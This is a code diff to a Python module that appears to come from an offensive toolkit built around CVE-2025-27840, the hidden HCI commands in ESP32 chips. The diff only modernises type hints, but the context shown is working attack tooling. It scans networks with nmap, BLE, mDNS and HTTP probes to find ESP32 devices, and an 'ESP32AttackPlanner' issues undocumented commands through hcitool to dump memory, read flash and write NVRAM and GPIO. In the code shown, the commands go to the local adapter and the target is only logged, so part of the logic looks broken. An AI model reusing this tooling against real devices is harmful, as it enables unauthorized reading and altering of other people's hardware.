@@ -13,10 +13,11 @@ CVE-2025-27840: ESP32 Hidden HCI Commands
 
 import asyncio
 import shutil
+from collections.abc import Callable
 from dataclasses import dataclass, field
 from datetime import datetime
 from enum import Enum
-from typing import TYPE_CHECKING, Any, Callable, Dict, List, Optional
+from typing import TYPE_CHECKING, Any
 
 import structlog
 
@@ -47,14 +48,14 @@ class ESP32DetectionMethod(Enum):
 class ESP32Device:
     """Detected ESP32 device information."""
     mac_address: str
-    ip_address: Optional[str] = None
-    detection_methods: List[ESP32DetectionMethod] = field(default_factory=list)
-    manufacturer_data: Optional[bytes] = None
-    ble_service_uuids: List[str] = field(default_factory=list)
-    mdns_hostname: Optional[str] = None
-    http_server: Optional[str] = None
-    firmware_version: Optional[str] = None
-    chip_model: Optional[str] = None  # ESP32, ESP32-S2, ESP32-S3, ESP32-C3
+    ip_address: str | None = None
+    detection_methods: list[ESP32DetectionMethod] = field(default_factory=list)
+    manufacturer_data: bytes | None = None
+    ble_service_uuids: list[str] = field(default_factory=list)
+    mdns_hostname: str | None = None
+    http_server: str | None = None
+    firmware_version: str | None = None
+    chip_model: str | None = None  # ESP32, ESP32-S2, ESP32-S3, ESP32-C3
     first_seen: datetime = field(default_factory=datetime.utcnow)
     last_seen: datetime = field(default_factory=datetime.utcnow)
     confidence: float = 0.0  # 0.0 to 1.0
@@ -113,7 +114,7 @@ class ESP32Detector:
     
     Integrates with existing WiFi and BLE scanners.
     """
-    
+
     def __init__(
         self,
         wifi_interface: str = "wlan0",
@@ -125,8 +126,8 @@ class ESP32Detector:
         self.ble_adapter = ble_adapter
         self.scan_timeout = scan_timeout
         self.enable_http_probe = enable_http_probe
-        
-        self.detected_devices: Dict[str, ESP32Device] = {}
+
+        self.detected_devices: dict[str, ESP32Device] = {}
         self._wifi_scanner = None
         self._ble_scanner = None
         self._http_session = None
@@ -141,34 +142,34 @@ class ESP32Detector:
     def _calculate_confidence(self, device: ESP32Device) -> float:
         """Calculate detection confidence score."""
         score = 0.0
-        
+
         # OUI match is strongest indicator
         if ESP32DetectionMethod.WIFI_OUI in device.detection_methods:
             score += 0.5
-        
+
         # BLE methods
         if ESP32DetectionMethod.BLE_MANUFACTURER in device.detection_methods:
             score += 0.2
         if ESP32DetectionMethod.BLE_SERVICE_UUID in device.detection_methods:
             score += 0.15
-        
+
         # mDNS and HTTP are weaker indicators alone
         if ESP32DetectionMethod.MDNS_HOSTNAME in device.detection_methods:
             score += 0.1
         if ESP32DetectionMethod.HTTP_SERVER_HEADER in device.detection_methods:
             score += 0.05
-        
+
         return min(score, 1.0)
 
-    async def detect_from_wifi_scan(self, networks: List[Any]) -> List[ESP32Device]:
+    async def detect_from_wifi_scan(self, networks: list[Any]) -> list[ESP32Device]:
         """Detect ESP32 devices from WiFi scan results."""
         detected = []
-        
+
         for network in networks:
             mac = getattr(network, 'bssid', None) or getattr(network, 'mac', None)
             if not mac:
                 continue
-            
+
             oui = self._get_oui(mac)
             if oui in ESP32_OUIS:
                 device = ESP32Device(
@@ -177,24 +178,24 @@ class ESP32Detector:
                 )
                 device.confidence = self._calculate_confidence(device)
                 detected.append(device)
-                
+
                 # Store in registry
                 self.detected_devices[mac] = device
-        
+
         return detected
 
-    async def detect_from_ble_scan(self, ble_devices: List[Any]) -> List[ESP32Device]:
+    async def detect_from_ble_scan(self, ble_devices: list[Any]) -> list[ESP32Device]:
         """Detect ESP32 devices from BLE scan results."""
         detected = []
-        
+
         for dev in ble_devices:
             mac = getattr(dev, 'address', None) or getattr(dev, 'mac', None)
             if not mac:
                 continue
-            
+
             methods = []
             confidence_boost = 0.0
-            
+
             # Check manufacturer data
             manufacturer_data = getattr(dev, 'manufacturer_data', None)
             if manufacturer_data:
@@ -204,7 +205,7 @@ class ESP32Detector:
                     if company_id in (0x02E5, 0x004C):  # Espressif or Apple (esp devices sometimes)
                         methods.append(ESP32DetectionMethod.BLE_MANUFACTURER)
                         confidence_boost += 0.2
-            
+
             # Check service UUIDs
             service_uuids = getattr(dev, 'service_uuids', None) or getattr(dev, 'services', None)
             if service_uuids:
@@ -214,7 +215,7 @@ class ESP32Detector:
                     if "fe2c" in uuid_lower or "180a" in uuid_lower:  # Generic Device Info
                         methods.append(ESP32DetectionMethod.BLE_SERVICE_UUID)
                         confidence_boost += 0.1
-            
+
             if methods:
                 device = ESP32Device(
                     mac_address=mac,
@@ -225,17 +226,17 @@ class ESP32Detector:
                 device.confidence = self._calculate_confidence(device) + confidence_boost
                 detected.append(device)
                 self.detected_devices[mac] = device
-        
+
         return detected
 
-    async def detect_from_mdns(self, mdns_services: List[Dict[str, Any]]) -> List[ESP32Device]:
+    async def detect_from_mdns(self, mdns_services: list[dict[str, Any]]) -> list[ESP32Device]:
         """Detect ESP32 devices from mDNS services."""
         detected = []
-        
+
         for service in mdns_services:
             hostname = service.get('hostname', '').lower()
             ip = service.get('ip', '')
-            
+
             for pattern in ESP32_MDNS_PATTERNS:
                 if pattern in hostname:
                     # Try to extract MAC from service info or use IP
@@ -243,7 +244,7 @@ class ESP32Detector:
                     if not mac and ip:
                         # Try to get MAC via ARP
                         mac = await self._get_mac_from_ip(ip)
-                    
+
                     if mac:
                         device = ESP32Device(
                             mac_address=mac,
@@ -255,10 +256,10 @@ class ESP32Detector:
                         detected.append(device)
                         self.detected_devices[mac] = device
                     break
-        
+
         return detected
 
-    async def _get_mac_from_ip(self, ip: str) -> Optional[str]:
+    async def _get_mac_from_ip(self, ip: str) -> str | None:
         """Get MAC address from IP using ARP."""
         try:
             proc = await asyncio.create_subprocess_exec(
@@ -268,7 +269,7 @@ class ESP32Detector:
             )
             stdout, _ = await proc.communicate()
             output = stdout.decode()
-            
+
             # Parse ARP output for MAC
             for line in output.split('\n'):
                 if ip in line:
@@ -280,14 +281,14 @@ class ESP32Detector:
             pass
         return None
 
-    async def probe_http(self, target: ESP32Device) -> Optional[ESP32Device]:
+    async def probe_http(self, target: ESP32Device) -> ESP32Device | None:
         """Probe ESP32 via HTTP to get firmware info."""
         if not self.enable_http_probe or not target.ip_address or not AIOHTTP_AVAILABLE or aiohttp is None:
             return None
-        
+
         if not self._http_session:
             self._http_session = aiohttp.ClientSession()
-        
+
         try:
             # Try common ESP32 web interfaces
             urls = [
@@ -296,14 +297,14 @@ class ESP32Detector:
                 f"http://{target.ip_address}/info",
                 f"http://{target.ip_address}/system/info",
             ]
-            
+
             for url in urls:
                 try:
                     async with self._http_session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                         if resp.status == 200:
                             server = resp.headers.get('Server', '')
                             target.http_server = server
-                            
+
                             # Check headers for ESP32 indicators
                             for header_val in server.split():
                                 if any(h in header_val.lower() for h in ESP32_HTTP_HEADERS):
@@ -311,23 +312,23 @@ class ESP32Detector:
                                         target.detection_methods.append(ESP32DetectionMethod.HTTP_SERVER_HEADER)
                                     target.confidence = self._calculate_confidence(target)
                                     break
-                            
+
                             # Try to get firmware info from response
                             text = await resp.text()
                             target.firmware_version = self._extract_firmware(text)
                             target.chip_model = self._extract_chip_model(text)
-                            
+
                 except Exception:
                     continue
-            
+
             return target
-            
+
         except Exception as e:
             logger.debug("HTTP probe failed", ip=target.ip_address, error=str(e))
-        
+
         return None
 
-    def _extract_firmware(self, text: str) -> Optional[str]:
+    def _extract_firmware(self, text: str) -> str | None:
         """Extract firmware version from HTTP response."""
         import re
         patterns = [
@@ -342,40 +343,40 @@ class ESP32Detector:
                 return match.group(1)
         return None
 
-    def _extract_chip_model(self, text: str) -> Optional[str]:
+    def _extract_chip_model(self, text: str) -> str | None:
         """Extract chip model from HTTP response."""
         text_lower = text.lower()
         if 'esp32-s3' in text_lower:
             return 'ESP32-S3'
-        elif 'esp32-s2' in text_lower:
+        if 'esp32-s2' in text_lower:
             return 'ESP32-S2'
-        elif 'esp32-c3' in text_lower:
+        if 'esp32-c3' in text_lower:
             return 'ESP32-C3'
-        elif 'esp32' in text_lower:
+        if 'esp32' in text_lower:
             return 'ESP32'
         return None
 
     async def run_full_detection(
         self,
         target_network: str = "192.168.1.0/24",
-        callback: Optional[Callable[[str], None]] = None,
-    ) -> List[ESP32Device]:
+        callback: Callable[[str], None] | None = None,
+    ) -> list[ESP32Device]:
         """Run complete ESP32 detection workflow."""
         all_devices = []
-        
+
         if callback:
             callback("Starting ESP32 detection...")
-        
+
         # 1. WiFi scan for OUI detection
         if callback:
             callback("Scanning WiFi for ESP32 devices...")
-        
+
         from urban_hs.modules.network import NmapScanner, ScanType
         nmap = NmapScanner()
-        
+
         # Host discovery to get live hosts
         hosts = await nmap.scan(target_network, ScanType.HOST_DISCOVERY, timeout=30)
-        
+
         # For each live host, try to get MAC
         wifi_devices = []
         for host in hosts:
@@ -384,14 +385,14 @@ class ESP32Detector:
                 network_mock = type('obj', (object,), {'bssid': mac})
                 detected = await self.detect_from_wifi_scan([network_mock])
                 wifi_devices.extend(detected)
-        
+
         if callback:
             callback(f"WiFi scan found {len(wifi_devices)} ESP32 candidates")
-        
+
         # 2. BLE scan
         if callback:
             callback("Starting BLE scan for ESP32...")
-        
+
         ble_devices = []
         try:
             from urban_hs.modules.ble import FastPairScanner
@@ -399,19 +400,19 @@ class ESP32Detector:
             await ble_scanner.start(scan_all=True)
             await asyncio.sleep(self.scan_timeout)
             await ble_scanner.stop()
-            
+
             ble_results = ble_scanner.get_devices()
             ble_devices = await self.detect_from_ble_scan(ble_results)
         except Exception as e:
             logger.debug("BLE scan failed", error=str(e))
-        
+
         if callback:
             callback(f"BLE scan found {len(ble_devices)} ESP32 candidates")
-        
+
         # 3. mDNS discovery
         if callback:
             callback("Running mDNS discovery...")
-        
+
         try:
             # Use nmap for mDNS
             nmap = NmapScanner()
@@ -427,16 +428,16 @@ class ESP32Detector:
             mdns_devices = await self.detect_from_mdns(mdns_results)
         except Exception:
             mdns_devices = []
-        
+
         if callback:
             callback(f"mDNS found {len(mdns_devices)} ESP32 candidates")
-        
+
         # 4. HTTP probing for high-confidence devices
         if callback:
             callback("Probing high-confidence devices via HTTP...")
-        
+
         all_devices = {}
-        
+
         # Merge all detected devices
         for device_list in [wifi_devices, ble_devices, mdns_devices]:
             for device in device_list:
@@ -450,19 +451,19 @@ class ESP32Detector:
                     existing.confidence = self._calculate_confidence(existing)
                 else:
                     all_devices[mac] = device
-        
+
         # Convert to list and sort by confidence
         merged_devices = list(all_devices.values())
         merged_devices.sort(key=lambda d: d.confidence, reverse=True)
-        
+
         # Probe top 5 devices via HTTP
         for device in merged_devices[:5]:
             if device.ip_address:
                 await self.probe_http(device)
-        
+
         if callback:
             callback(f"Detection complete. Found {len(merged_devices)} ESP32 devices")
-        
+
         return merged_devices
 
 
@@ -505,7 +506,7 @@ class ESP32AttackPlanner:
         opcode: int,
         params: bytes = b"",
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """
         Execute an undocumented HCI command on an ESP32 device.
         
@@ -540,39 +541,39 @@ class ESP32AttackPlanner:
             # Using hcitool cmd <ogf> <ocf> [parameters]
             ogf = 0x3F  # Vendor specific
             ocf = opcode & 0x03FF
-            
+
             # Convert params to hex string
             params_hex = params.hex() if params else ""
-            
+
             # Build hcitool command
             cmd = ["hcitool", "-i", adapter, "cmd", f"0x{ogf:02x}", f"0x{ocf:04x}"]
             if params_hex:
                 cmd.append(params_hex)
-            
-            logger.info("Executing HCI command", 
-                       target=target.mac_address, 
+
+            logger.info("Executing HCI command",
+                       target=target.mac_address,
                        opcode=hex(opcode),
                        params=params_hex)
-            
+
             # Execute hcitool command
             proc = await asyncio.create_subprocess_exec(
                 *cmd,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
             )
-            
+
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
-            
+
             if proc.returncode != 0:
                 return {
                     "success": False,
                     "error": stderr.decode().strip(),
                     "command": " ".join(cmd),
                 }
-            
+
             # Parse response
             response = stdout.decode().strip()
-            
+
             return {
                 "success": True,
                 "opcode": hex(opcode),
@@ -580,8 +581,8 @@ class ESP32AttackPlanner:
                 "response": response,
                 "parsed": self._parse_hci_response(opcode, response),
             }
-            
-        except asyncio.TimeoutError:
+
+        except TimeoutError:
             return {
                 "success": False,
                 "error": "HCI command timed out (10s)",
@@ -593,12 +594,12 @@ class ESP32AttackPlanner:
                 "error": str(e),
             }
 
-    def _parse_hci_response(self, opcode: int, response: str) -> Dict[str, Any]:
+    def _parse_hci_response(self, opcode: int, response: str) -> dict[str, Any]:
         """Parse HCI command response."""
         # HCI event response format: 04 0E ... (command complete event)
         # Parse based on opcode
         parsed = {"raw": response}
-        
+
         try:
             # Remove HCI event header if present
             # Typical format: "04 0E <packet_len> <num_hci_cmds> <opcode_low> <opcode_high> <status> <data...>"
@@ -615,7 +616,7 @@ class ESP32AttackPlanner:
                     parsed["data"] = " ".join(parts[7:])
         except Exception:
             pass
-        
+
         return parsed
 
     async def execute_memory_dump(
@@ -624,7 +625,7 @@ class ESP32AttackPlanner:
         address: int,
         length: int = 256,
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """
         Read arbitrary RAM from ESP32 via undocumented HCI command (0xFC00).
         
@@ -639,7 +640,7 @@ class ESP32AttackPlanner:
         target: ESP32Device,
         gpio_num: int,
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Read GPIO state via undocumented HCI command (0xFC03)."""
         params = gpio_num.to_bytes(1, "little")
         return await self.execute_hci_command(target, 0xFC03, params, adapter)
@@ -650,7 +651,7 @@ class ESP32AttackPlanner:
         gpio_num: int,
         value: int,
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Write GPIO state via undocumented HCI command (0xFC04)."""
         params = gpio_num.to_bytes(1, "little") + value.to_bytes(1, "little")
         return await self.execute_hci_command(target, 0xFC04, params, adapter)
@@ -661,7 +662,7 @@ class ESP32AttackPlanner:
         address: int,
         length: int = 32,
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Read NVRAM via undocumented HCI command (0xFC05)."""
         params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
         return await self.execute_hci_command(target, 0xFC05, params, adapter)
@@ -672,7 +673,7 @@ class ESP32AttackPlanner:
         address: int,
         data: bytes,
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Write NVRAM via undocumented HCI command (0xFC06)."""
         params = address.to_bytes(4, "little") + data
         return await self.execute_hci_command(target, 0xFC06, params, adapter)
@@ -683,7 +684,7 @@ class ESP32AttackPlanner:
         address: int,
         length: int = 256,
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Read flash memory via undocumented HCI command (0xFC09)."""
         params = address.to_bytes(4, "little") + length.to_bytes(2, "little")
         return await self.execute_hci_command(target, 0xFC09, params, adapter)
@@ -692,18 +693,18 @@ class ESP32AttackPlanner:
         self,
         target: ESP32Device,
         adapter: str = "hci0",
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """Get chip ID/revision via undocumented HCI command (0xFC07)."""
         return await self.execute_hci_command(target, 0xFC07, b"", adapter)
 
-    async def plan_attacks(self, targets: List[ESP32Device]) -> Dict[str, Any]:
+    async def plan_attacks(self, targets: list[ESP32Device]) -> dict[str, Any]:
         """Plan exploits based on detected devices."""
         plans = {}
-        
+
         for target in targets:
             if target.confidence < 0.5:
                 continue
-            
+
             plans[target.mac_address] = {
                 "target": target.mac_address,
                 "confidence": target.confidence,
@@ -723,7 +724,7 @@ class ESP32AttackPlanner:
                     "HCI interface accessible (no authentication)",
                 ],
             }
-        
+
         return plans
 
 
@@ -736,8 +737,8 @@ async def detect_esp32_devices(
     wifi_interface: str = "wlan0",
     ble_adapter: str = "hci0",
     scan_timeout: int = 30,
-    callback: Optional[Callable[[str], None]] = None,
-) -> List[ESP32Device]:
+    callback: Callable[[str], None] | None = None,
+) -> list[ESP32Device]:
     """Convenience function for ESP32 detection."""
     detector = ESP32Detector(
         wifi_interface=wifi_interface,
@@ -750,7 +751,7 @@ async def detect_esp32_devices(
 async def scan_esp32_ble(
     ble_adapter: str = "hci0",
     scan_timeout: int = 15,
-) -> List[ESP32Device]:
+) -> list[ESP32Device]:
     """Quick BLE-only ESP32 scan."""
     detector = ESP32Detector(ble_adapter=ble_adapter, scan_timeout=scan_timeout)
     from urban_hs.modules.ble import FastPairScanner
@@ -762,7 +763,7 @@ async def scan_esp32_ble(
     return await detector.detect_from_ble_scan(ble_results)
 
 
-async def plan_esp32_attacks(targets: List[ESP32Device]) -> Dict[str, Any]:
+async def plan_esp32_attacks(targets: list[ESP32Device]) -> dict[str, Any]:
     """Generate attack plans for ESP32 targets."""
     detector = ESP32Detector()
     planner = ESP32AttackPlanner(detector)
